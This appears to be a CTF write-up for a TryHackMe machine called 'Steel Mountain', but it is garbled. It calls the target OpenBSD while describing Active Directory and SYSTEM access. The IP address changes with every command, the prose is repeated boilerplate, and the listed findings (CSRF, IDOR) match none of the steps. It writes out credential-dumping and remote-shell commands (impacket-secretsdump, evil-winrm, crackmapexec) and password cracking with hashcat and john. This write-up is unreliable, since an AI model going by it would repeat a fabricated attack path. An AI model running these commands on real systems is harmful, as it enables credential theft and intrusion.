---
TitleSEO: "TryHackMe — Steel Mountain (Insane OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Steel Mountain (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Steel Mountain. CSRF and IDOR to achieve insane compromise on OpenBSD."
Keywords: "pwntilldawn, offsec, web, medium, active directory, windows, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-steel-mountain-689.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-steel-mountain-689/"
Date: "2024-10-28"
Tags: "PwnTillDawn, OffSec, Web, Medium, Active Directory, Windows, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-steel-mountain-689"
Permalink: "/writeups/htb-steel-mountain-689.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Steel Mountain** is rated **Insane** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.74.225.249`.

### Objectives

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.170.50
evil-winrm -i 10.108.122.191 -u administrator -p 'P@ssw0rd!'
```

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.38.162
gobuster dir -u http://10.129.97.64/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.117.97
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The target system was identified as running a vulnerable version of the service.

### Web Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
evil-winrm -i 10.72.12.15 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

Key finding: **IDOR**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

### Initial Access

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.57.80.54
crackmapexec smb 10.31.96.202 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

```powershell
nmap -sCV -p3268,8080,587 10.26.164.59 -oN scan.txt
gobuster dir -u http://10.99.86.74/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
crackmapexec smb 10.35.134.18 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.126.209.4
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `atexec`
- `feroxbuster`
- `smbclient`
- `lookupsid`
- `netcat`
- `socat`
- `john`

### Key Takeaways

- CSRF
- IDOR
- Command Injection
